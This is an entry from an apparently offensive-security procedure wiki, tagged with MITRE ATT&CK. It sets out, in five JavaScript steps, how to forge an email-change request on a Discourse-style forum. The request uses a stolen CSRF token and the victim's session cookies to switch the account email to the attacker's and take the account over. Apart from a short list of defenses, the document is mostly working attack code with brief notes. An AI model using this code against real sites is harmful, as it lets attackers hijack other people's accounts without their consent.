---
tags:
  - account-takeover
  - forgery
  - javascript
type: procedure
tools:
  - '[[tools/JavaScript-for-Client-Side-Exploitation]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/js-xmlhttprequest-post-email-change]]'
  - '[[commands/js-set-request-headers]]'
  - '[[commands/js-set-withcredentials]]'
  - '[[commands/js-build-email-body]]'
  - '[[commands/js-send-blob-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:24.438Z'
sub_techniques: []
id: a9d122cd-7f2f-43a7-ab7d-ca4f7a40efb0
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[JavaScript]]'
---
# Forge Email Change Request Using Leaked Credentials

## Summary

This procedure uses the extracted CSRF token and username to forge a POST request from JavaScript, changing the victim's email and enabling account takeover upon verification.

## Description

JavaScript constructs an XMLHttpRequest to /users/$username/preferences/email.json with _method=PUT, new email, and authenticity_token. withCredentials=true includes session cookies. Attacker verifies the change via email link.

## Requirements

1. Extracted csrf and user from prior step
2. Attacker's email for change_to
3. Client-side execution post-extraction

## Defense

Defensive measures and detection strategies:

- Enforce short CSRF token expiry and per-session binding
- Require re-auth for sensitive actions like email change
- Monitor for anomalous POSTs to preferences/email.json

## Objectives

1. Submit forged email change
2. Receive and click verification
3. Gain control of victim account

## Instructions

### Step 1: Initialize XMLHttpRequest

**Context**: Open POST to email endpoint.

**Command** ([[commands/js-xmlhttprequest-post-email-change]]):
```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', discourse + '/users/' + user + '/preferences/email.json', true);
```

> Configures async POST.

### Step 2: Set Headers

**Context**: Mimic form submission.

**Command** ([[commands/js-set-request-headers]]):
```javascript
xhr.setRequestHeader('Accept', 'text/html');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
```

> Applies necessary headers.

### Step 3: Enable Credentials

**Context**: Include cookies for auth.

**Command** ([[commands/js-set-withcredentials]]):
```javascript
xhr.withCredentials = true;
```

> Sends session data.

### Step 4: Build Body

**Context**: Construct payload with token.

**Command** ([[commands/js-build-email-body]]):
```javascript
var body = '_method=PUT&email=' + encodeURIComponent(change_email_to) + '&authenticity_token=' + encodeURIComponent(csrf);
```

> Encodes form data.

### Step 5: Send Request

**Context**: Transmit as Blob.

**Command** ([[commands/js-send-blob-request]]):
```javascript
var aBody = new Uint8Array(body.length);
for(var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
```

> Sends request; handle onload for success.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Valid Accounts]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/js-xmlhttprequest-post-email-change]]
- [[commands/js-set-request-headers]]
- [[commands/js-set-withcredentials]]
- [[commands/js-build-email-body]]
- [[commands/js-send-blob-request]]

## Tools Used

- [[tools/JavaScript-for-Client-Side-Exploitation]]

## Tags

- [[account-takeover]]
- [[forgery]]
- [[JavaScript]]
